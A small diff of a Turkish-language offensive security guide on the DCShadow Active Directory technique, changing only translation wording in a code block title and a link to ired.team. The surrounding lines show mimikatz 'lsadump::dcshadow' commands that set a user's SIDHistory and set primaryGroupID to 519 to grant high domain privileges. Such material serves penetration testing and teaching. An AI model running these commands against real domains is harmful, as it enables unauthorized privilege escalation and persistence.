@@ -62,7 +62,7 @@ lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-28053487
 ```
 {% endcode %}
 
-{% code title="PrimaryGroupID'yi Değiştir (kullanıcıyı Alan Yöneticileri üyesi yap)" %}
+{% code title="PrimaryGroupID'yi Değiştir (kullanıcıyı Domain Administrators üyesi yap)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
@@ -95,7 +95,7 @@ Bu durumda **birden fazla değişiklik** yapmanız gerektiğini unutmayın, sade
 
 
 
-[**DCShadow hakkında daha fazla bilgi için ired.team'i ziyaret edin.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**DCShadow hakkında daha fazla bilgi için ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 
 {% hint style="success" %}
